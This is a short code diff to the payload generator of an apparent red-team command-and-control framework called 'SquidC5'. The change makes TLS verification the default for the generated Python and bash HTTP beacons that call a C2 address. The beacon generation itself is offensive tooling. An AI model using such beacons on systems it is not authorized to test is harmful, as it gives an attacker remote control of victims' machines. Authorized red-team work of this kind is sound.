@@ -118,7 +118,8 @@ class PayloadGenerator:
         scheme = (extra.get("scheme") or "https").lower()
         if scheme not in ("http", "https"):
             scheme = "https"
-        insecure = bool(extra.get("insecure", scheme == "https"))
+        # insecure TLS verify only when operator explicitly sets insecure=true (lab self-signed)
+        insecure = bool(extra.get("insecure", False))
         return f'''#!/usr/bin/env python3
 # SquidC5 HTTP beacon — authorized testing only (profile-aware)
 import json, random, time, urllib.request, ssl
@@ -219,7 +220,8 @@ while True:
         scheme = (extra.get("scheme") or "https").lower()
         if scheme not in ("http", "https"):
             scheme = "https"
-        curl_k = "-k " if scheme == "https" else ""
+        # -k only when operator explicitly opts into lab self-signed
+        curl_k = "-k " if bool(extra.get("insecure", False)) else ""
         return f'''#!/bin/bash
 # SquidC5 HTTP beacon — authorized testing only (profile-aware path/UA)
 C2="{scheme}://{host}:{port}{path}"
